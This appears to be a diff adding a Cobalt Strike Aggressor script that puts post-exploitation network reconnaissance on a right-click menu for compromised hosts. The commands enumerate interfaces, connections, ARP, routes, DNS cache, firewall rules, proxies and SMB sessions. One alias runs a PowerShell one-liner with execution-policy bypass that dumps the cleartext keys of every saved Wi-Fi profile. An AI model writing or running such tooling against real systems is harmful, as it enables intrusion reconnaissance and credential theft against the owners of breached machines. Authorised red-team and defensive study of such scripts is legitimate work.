@@ -1,0 +1,126 @@
+# net_enum.cna — Network enumeration
+# Covers: interfaces, routing, connections, DNS, firewall, proxies
+
+alias ipconfig-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating network interfaces");
+    bshell($bid, "ipconfig /all");
+    bshell($bid, "wmic nicconfig get Description,IPAddress,IPSubnet,DefaultIPGateway,DNSServerSearchOrder,MACAddress /format:list");
+}
+
+alias netconn-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating active network connections");
+    bshell($bid, "netstat -ano");
+    bshell($bid, "netstat -anob 2>nul");
+}
+
+alias arp-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Dumping ARP cache");
+    bshell($bid, "arp -a");
+}
+
+alias route-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating routing table");
+    bshell($bid, "route print");
+}
+
+alias dns-cache {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Dumping DNS cache");
+    bshell($bid, "ipconfig /displaydns");
+    bshell($bid, "powershell -ep bypass -c \"Get-DnsClientCache | Select-Object -Property Entry,RecordName,RecordType,Status,DataLength,Data | Format-Table -AutoSize\"");
+}
+
+alias hosts-file {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Reading hosts file");
+    bshell($bid, "type C:\\Windows\\System32\\drivers\\etc\\hosts");
+}
+
+alias firewall-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating firewall rules");
+    bshell($bid, "netsh advfirewall show allprofiles");
+    bshell($bid, "netsh advfirewall firewall show rule name=all");
+}
+
+alias proxy-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking proxy configuration");
+    bshell($bid, "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable");
+    bshell($bid, "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer");
+    bshell($bid, "netsh winhttp show proxy");
+}
+
+alias wifi-enum {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Enumerating wireless profiles");
+    bshell($bid, "netsh wlan show profiles");
+    bshell($bid, "netsh wlan show interfaces");
+    # Dump cleartext keys for saved profiles
+    bshell($bid, "powershell -ep bypass -c \"(netsh wlan show profiles) | Select-String '\\s+:\\s+(.+)' | ForEach-Object { $p=$_.Matches.Groups[1].Value; (netsh wlan show profile name=$p key=clear) | Select-String 'Key Content' | ForEach-Object { Write-Host \\\"$p : $($_.Matches.Groups[0].Value)\\\" } }\"");
+}
+
+alias smb-sessions {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking SMB sessions and open files");
+    bshell($bid, "net session");
+    bshell($bid, "net file");
+    bshell($bid, "net statistics workstation");
+    bshell($bid, "net statistics server");
+}
+
+alias port-scan-local {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Listing locally listening ports");
+    bshell($bid, "netstat -ano | findstr LISTENING");
+}
+
+alias net-enum-all {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c2[*] === Running full network enumeration ===");
+    ipconfig-enum($bid);
+    netconn-enum($bid);
+    arp-enum($bid);
+    route-enum($bid);
+    dns-cache($bid);
+    hosts-file($bid);
+    firewall-enum($bid);
+    proxy-enum($bid);
+    smb-sessions($bid);
+}
+
+# ─── right-click menu ───────────────────────────────────────────────────────
+
+popup beacon_bottom {
+    menu "Enum: Network" {
+        item "IP Config / NICs"       { ipconfig-enum(selectedBeacons()); }
+        item "Active Connections"     { netconn-enum(selectedBeacons()); }
+        item "ARP Cache"              { arp-enum(selectedBeacons()); }
+        item "Routing Table"          { route-enum(selectedBeacons()); }
+        item "DNS Cache"              { dns-cache(selectedBeacons()); }
+        item "Hosts File"             { hosts-file(selectedBeacons()); }
+        item "Firewall Rules"         { firewall-enum(selectedBeacons()); }
+        item "Proxy Config"           { proxy-enum(selectedBeacons()); }
+        item "WiFi Profiles"          { wifi-enum(selectedBeacons()); }
+        item "SMB Sessions"           { smb-sessions(selectedBeacons()); }
+        item "Listening Ports"        { port-scan-local(selectedBeacons()); }
+        separator;
+        item "\[Run All\] Network Enum" { net-enum-all(selectedBeacons()); }
+    }
+}
